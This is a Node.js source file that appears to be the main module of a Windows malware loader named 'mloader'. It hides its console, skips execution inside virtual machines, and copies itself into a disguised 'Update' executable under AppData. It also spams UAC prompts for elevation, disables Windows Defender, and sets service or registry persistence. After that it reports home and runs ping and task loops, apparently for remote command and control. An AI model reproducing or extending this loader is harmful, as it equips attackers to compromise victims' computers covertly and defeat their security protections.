const fs = require('fs');
const path = require('path');
const windowsMutex = require('windows-mutex');
const config = require('./config');
const core = require('./utils/core');
const uac = require('./utils/uac');
const persistence = require('./utils/persistence');
const report = require('./utils/report');
const tasks = require('./utils/tasks');
const ping = require('./utils/ping');
const consoleWindow = require("node-hide-console-window");

let mutex;

async function main() {
    mutex = new windowsMutex.Mutex('mloader');

    if (config.antivm) {
        if (core.inVm()) {
            return
        }
    }

    const firstRun = core.firstRun();

    if (firstRun) {
        const persistencePath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `Update${core.randomString(4)}.exe`);

        core.createDirectoryRecursively(persistencePath);
        fs.copyFileSync(process.execPath, persistencePath);
        core.hideFile(persistencePath);

        if (config.uacSpam) {
            uac.uacSpam(persistencePath);
        } else {
            if (uac.isElevated()) {
                if (config.disableDefender) {
                    core.disableDefender();
                }
            }
            uac.runProcess(persistencePath, false);
            mutex.release();
            process.exit(0);
        }
    }

    if (!firstRun) {
        const setPersistence = core.setPersistence();

        if (setPersistence) {
            const random = core.randomString(4);
            if (uac.isElevated()) {
                if (config.disableDefender) {
                    core.disableDefender();
                }
                persistence.addServicePersistence(process.execPath, random);
            } else {
                persistence.addRegistryPersistence(process.execPath, random);
            }

            report.submitReport();
        }
    }

    await Promise.all([
        ping.runPing(),
        tasks.runTasks()
    ]);

    mutex.release();
}

consoleWindow.hideConsole();
main();

module.exports = {
    mutex
}